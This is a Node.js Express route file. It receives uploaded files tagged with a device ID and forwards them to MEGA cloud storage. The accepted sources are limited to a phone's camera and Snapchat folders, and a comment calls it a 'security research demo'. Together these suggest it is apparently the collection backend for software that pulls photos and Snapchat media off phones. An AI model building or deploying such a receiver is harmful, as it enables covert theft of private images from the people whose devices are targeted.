const express = require('express');
const multer = require('multer');
const megaService = require('../services/megaService');
const deviceManager = require('../services/deviceManager');
const logger = require('../utils/logger');

const router = express.Router();

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 100 * 1024 * 1024, // 100MB limit
    files: 1 // Single file upload
  },
  fileFilter: (req, file, cb) => {
    // Accept all file types for security research demo
    cb(null, true);
  }
});

// Upload endpoint with multipart file handling
router.post('/', upload.single('file'), async (req, res) => {
  const uploadStartTime = Date.now();
  let uploadId = null;
  
  try {
    // Validate request
    if (!req.file) {
      return res.status(400).json({
        success: false,
        error: 'No file provided',
        message: 'File is required for upload'
      });
    }

    // Extract device identification and metadata
    const {
      deviceId,
      sourceLocation = 'DCIM_CAMERA',
      originalPath,
      timestamp
    } = req.body;

    // Validate required fields
    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: 'Device ID is required',
        message: 'deviceId field must be provided'
      });
    }

    // Validate source location
    const validSourceLocations = ['DCIM_CAMERA', 'DCIM_SNAPCHAT', 'SNAPCHAT_ROOT'];
    if (!validSourceLocations.includes(sourceLocation)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid source location',
        message: `sourceLocation must be one of: ${validSourceLocations.join(', ')}`
      });
    }

    // Generate upload ID for tracking
    uploadId = `${deviceId}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // Log upload request
    logger.info(`Upload request [${uploadId}]: ${req.file.originalname} from device ${deviceId} (${sourceLocation}) - ${req.file.size} bytes`);

    // Check MEGA connection
    const isConnected = await megaService.checkConnection();
    if (!isConnected) {
      logger.warn(`MEGA not connected [${uploadId}], attempting reconnection...`);
      const reconnected = await megaService.reconnect();
      if (!reconnected) {
        return res.status(503).json({
          success: false,
          error: 'MEGA service unavailable',
          message: 'Unable to connect to MEGA Drive',
          retryable: true
        });
      }
    }

    // Register device if not already registered
    deviceManager.registerDevice(deviceId, {
      sourceLocation: sourceLocation,
      lastUploadAttempt: new Date().toISOString()
    });

    // Upload file to MEGA service
    const uploadResult = await megaService.uploadFile(
      req.file.buffer,
      req.file.originalname,
      deviceId,
      sourceLocation,
      {
        originalPath: originalPath,
        timestamp: timestamp,
        uploadId: uploadId
      }
    );

    // Calculate upload duration
    const uploadDuration = Date.now() - uploadStartTime;

    // Prepare response
    const response = {
      success: uploadResult.success,
      uploadId: uploadId,
      fileName: uploadResult.fileName,
      originalName: uploadResult.originalName || req.file.originalname,
      deviceId: deviceId,
      sourceLocation: sourceLocation,
      fileSize: req.file.size,
      uploadTime: uploadResult.uploadTime,
      uploadDurationMs: uploadDuration,
      folderPath: uploadResult.folderPath
    };

    // Add additional fields based on upload result
    if (uploadResult.success) {
      response.fileId = uploadResult.fileId;
      response.uploadSpeed = uploadResult.uploadSpeed;
      
      if (uploadResult.skipped) {
        response.skipped = true;
        response.reason = uploadResult.reason;
      }
      
      logger.info(`Upload successful [${uploadId}]: ${uploadResult.fileName} (${req.file.size} bytes) in ${uploadDuration}ms`);
      res.status(200).json(response);
    } else {
      response.error = uploadResult.error;
      response.retryable = uploadResult.retryable || false;
      
      logger.error(`Upload failed [${uploadId}]: ${uploadResult.error}`);
      res.status(500).json(response);
    }

  } catch (error) {
    const uploadDuration = Date.now() - uploadStartTime;
    logger.error(`Upload endpoint error [${uploadId}]:`, error);
    
    res.status(500).json({
      success: false,
      uploadId: uploadId,
      error: 'Internal server error',
      message: error.message,
      uploadDurationMs: uploadDuration,
      retryable: true
    });
  }
});

// Batch upload endpoint for multiple files
router.post('/batch', upload.array('files', 10), async (req, res) => {
  const batchStartTime = Date.now();
  let batchId = null;
  
  try {
    // Validate request
    if (!req.files || req.files.length === 0) {
      return res.status(400).json({
        success: false,
        error: 'No files provided',
        message: 'At least one file is required for batch upload'
      });
    }

    // Extract device identification
    const {
      deviceId,
      sourceLocation = 'DCIM_CAMERA'
    } = req.body;

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: 'Device ID is required',
        message: 'deviceId field must be provided'
      });
    }

    // Generate batch ID for tracking
    batchId = `batch_${deviceId}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    logger.info(`Batch upload request [${batchId}]: ${req.files.length} files from device ${deviceId} (${sourceLocation})`);

    // Check MEGA connection
    const isConnected = await megaService.checkConnection();
    if (!isConnected) {
      const reconnected = await megaService.reconnect();
      if (!reconnected) {
        return res.status(503).json({
          success: false,
          error: 'MEGA service unavailable',
          message: 'Unable to connect to MEGA Drive',
          retryable: true
        });
      }
    }

    // Prepare files for batch upload
    const files = req.files.map(file => ({
      buffer: file.buffer,
      fileName: file.originalname,
      size: file.size
    }));

    // Upload files using MEGA service batch upload
    const batchResult = await megaService.uploadMultipleFiles(files, deviceId, sourceLocation);

    const batchDuration = Date.now() - batchStartTime;

    // Prepare response
    const response = {
      success: batchResult.summary.failed === 0,
      batchId: batchId,
      deviceId: deviceId,
      sourceLocation: sourceLocation,
      summary: batchResult.summary,
      results: batchResult.results,
      batchDurationMs: batchDuration
    };

    logger.info(`Batch upload completed [${batchId}]: ${batchResult.summary.successful}/${batchResult.summary.total} successful in ${batchDuration}ms`);
    
    // Return 207 Multi-Status for partial success, 200 for complete success
    const statusCode = batchResult.summary.failed > 0 ? 207 : 200;
    res.status(statusCode).json(response);

  } catch (error) {
    const batchDuration = Date.now() - batchStartTime;
    logger.error(`Batch upload endpoint error [${batchId}]:`, error);
    
    res.status(500).json({
      success: false,
      batchId: batchId,
      error: 'Internal server error',
      message: error.message,
      batchDurationMs: batchDuration,
      retryable: true
    });
  }
});

// Upload validation endpoint
router.get('/validate/:fileId', async (req, res) => {
  try {
    const { fileId } = req.params;
    
    if (!fileId) {
      return res.status(400).json({
        success: false,
        error: 'File ID is required'
      });
    }

    const validation = await megaService.validateUpload(fileId);
    
    res.status(200).json({
      success: true,
      validation: validation
    });

  } catch (error) {
    logger.error('Upload validation error:', error);
    
    res.status(500).json({
      success: false,
      error: 'Validation failed',
      message: error.message
    });
  }
});

module.exports = router;